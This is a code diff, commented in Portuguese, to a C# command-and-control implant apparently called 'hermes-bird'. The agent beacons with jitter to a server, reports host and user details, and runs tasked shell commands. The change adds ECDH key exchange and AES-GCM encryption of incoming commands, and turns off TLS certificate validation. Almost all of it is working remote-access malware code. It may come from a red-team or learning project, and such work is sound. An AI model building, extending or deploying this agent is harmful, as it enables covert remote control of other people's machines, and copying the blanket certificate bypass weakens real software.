@@ -2,18 +2,26 @@ using System.Diagnostics;
 using System.Text;
 using System.Text.Json;
 using System.Net.NetworkInformation;
+using System.Security.Cryptography;
+
 
 class Agent
 {
     // Configuração do servidor e beacon
-    static readonly string SERVER_URL    = "http://localhost:3000";
+    static readonly string SERVER_URL    = "https://localhost:3000";
     static int    BEACON_BASE = 5;
     static int    BEACON_JITTER = 50;
     static readonly int    CMD_TIMEOUT_MS = 30000;
 
-    static readonly HttpClient http = new HttpClient();
+    static readonly HttpClient http = new HttpClient(new HttpClientHandler{
+    ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) => true
+    });
+
     static string agentId    = "";
     static string agentToken = "";
+    static byte[]? sessionKey = null;
+    static ECDiffieHellman ecdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);
+
 
     // Começa no diretório onde o agente foi executado.
     static string currentDir = Directory.GetCurrentDirectory();
@@ -32,6 +40,22 @@ class Agent
 
         Console.WriteLine($"[+] Registrado com ID: {agentId}");
 
+
+    static string DecryptPayload(string encryptedBase64, byte[] key){
+        byte[] buf = Convert.FromBase64String(encryptedBase64);
+
+        byte[] iv         = buf[0..12];
+        byte[] tag        = buf[^16..];
+        byte[] ciphertext = buf[12..^16];
+
+        byte[] plaintext = new byte[ciphertext.Length];
+
+        using var aes = new AesGcm(key, 16);
+        aes.Decrypt(iv, ciphertext, tag, plaintext);
+
+        return Encoding.UTF8.GetString(plaintext);
+    }
+
         // Loop de beacon
         while (true)
         {
@@ -41,14 +65,26 @@ class Agent
 
                 var tasks = await GetTasks();
 
-                foreach (var task in tasks)
-                {
-                    string taskId  = task.GetProperty("_id").GetString() ?? "";
-                    string command = task.GetProperty("command").GetString() ?? "";
-                    string stdin   = task.TryGetProperty("stdin", out var stdinProp)
-                                     ? stdinProp.GetString() ?? "" : "";
-                    string shell   = task.TryGetProperty("shell", out var shellProp)
-                                     ? shellProp.GetString() ?? "auto" : "auto";
+                foreach (var task in tasks){
+                    string taskId = task.GetProperty("_id").GetString() ?? "";
+
+                    string command, stdin, shell;
+
+                    if (task.TryGetProperty("encrypted", out var encProp) && sessionKey != null){
+                        string decrypted = DecryptPayload(encProp.GetString()!, sessionKey);
+                        var inner = JsonDocument.Parse(decrypted).RootElement;
+
+                        command = inner.GetProperty("command").GetString() ?? "";
+                        stdin   = inner.TryGetProperty("stdin", out var s) ? s.GetString() ?? "" : "";
+                        shell   = inner.TryGetProperty("shell", out var sh) ? sh.GetString() ?? "auto" : "auto";
+                    }
+                    else{
+                        command = task.GetProperty("command").GetString() ?? "";
+                        stdin   = task.TryGetProperty("stdin", out var stdinProp)
+                                ? stdinProp.GetString() ?? "" : "";
+                        shell   = task.TryGetProperty("shell", out var shellProp)
+                                ? shellProp.GetString() ?? "auto" : "auto";
+                    }
 
                     Console.WriteLine($"[>] Executando [{shell}]: {command}");
 
@@ -57,6 +93,7 @@ class Agent
                     await SendResult(taskId, output);
                     Console.WriteLine($"[+] Resultado enviado para tarefa {taskId}");
                 }
+
             }
             catch (Exception ex)
             {
@@ -72,8 +109,6 @@ class Agent
         }
     }
 
-    // Comandos internos (cd, pwd) são resolvidos pelo próprio agente sem criar
-    // nenhum processo, reduzindo ruído no sistema.
     static string HandleCommand(string command, string stdin = "", string shell = "auto")
     {
         string trimmed = command.Trim();
@@ -195,11 +230,8 @@ class Agent
         return currentDir;
     }
 
-    // Executa um comando no shell do sistema.
-    // Sempre usa currentDir como WorkingDirectory, garantindo que
-    // o comando roda no diretório certo mesmo sendo um processo novo.
-    static string ExecuteCommand(string command, string stdin = "", string shell = "auto")
-    {
+    
+    static string ExecuteCommand(string command, string stdin = "", string shell = "auto"){
         try
         {
             bool isWindows = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
@@ -270,21 +302,24 @@ class Agent
         }
     }
 
-    // Registra no servidor enviando informações da máquina.
-    // Inclui o currentDir para que o dashboard possa exibir
-    // onde o agente está navegando.
-    static async Task Register()
-    {
-        var payload = new
-        {
-            hostname = Environment.MachineName,
-            username = Environment.UserName,
-            os       = Environment.OSVersion.ToString(),
-            ip       = GetLocalIP(),
-            arch     = Environment.Is64BitOperatingSystem ? "x64" : "x86",
-            pid      = Environment.ProcessId,
-            token    = string.IsNullOrEmpty(agentToken) ? null : agentToken,
-            cwd      = currentDir
+    static async Task Register(){
+        var ecParams = ecdh.ExportParameters(false);
+        byte[] pubBytes = new byte[65];
+        pubBytes[0] = 0x04;
+        Buffer.BlockCopy(ecParams.Q.X!, 0, pubBytes, 1, 32);
+        Buffer.BlockCopy(ecParams.Q.Y!, 0, pubBytes, 33, 32);
+        string publicKeyHex = Convert.ToHexString(pubBytes).ToLower();
+
+        var payload = new{
+            hostname  = Environment.MachineName,
+            username  = Environment.UserName,
+            os        = Environment.OSVersion.ToString(),
+            ip        = GetLocalIP(),
+            arch      = Environment.Is64BitOperatingSystem ? "x64" : "x86",
+            pid       = Environment.ProcessId,
+            token     = string.IsNullOrEmpty(agentToken) ? null : agentToken,
+            cwd       = currentDir,
+            publicKey = publicKeyHex
         };
 
         string json     = JsonSerializer.Serialize(payload);
@@ -297,7 +332,37 @@ class Agent
 
         agentId    = agent.GetProperty("_id").GetString() ?? "";
         agentToken = agent.GetProperty("token").GetString() ?? "";
+
+        if (doc.RootElement.TryGetProperty("serverPublicKey", out var spk)){
+            string serverPubHex = spk.GetString() ?? "";
+            if (!string.IsNullOrEmpty(serverPubHex)){
+                byte[] serverPubBytes = Convert.FromHexString(serverPubHex);
+
+                // Extrair X e Y do uncompressed point (04 || X[32] || Y[32])
+                var serverParams = new ECParameters{
+                    Curve = ECCurve.NamedCurves.nistP256,
+                    Q = new ECPoint {
+                        X = serverPubBytes[1..33],
+                        Y = serverPubBytes[33..65]
+                    }
+                };
+
+                using var serverEcdh = ECDiffieHellman.Create(serverParams);
+                byte[] sharedSecret = ecdh.DeriveRawSecretAgreement(serverEcdh.PublicKey);
+
+                sessionKey = HKDF.DeriveKey(
+                    HashAlgorithmName.SHA256,
+                    sharedSecret,
+                    32,
+                    salt: Array.Empty<byte>(),
+                    info: Encoding.UTF8.GetBytes("hermes-bird-session")
+                );
+
+                Console.WriteLine("[+] Session key derivada com sucesso");
+            }
+        }
     }
+
 
     static async Task<JsonElement[]> GetTasks()
     {
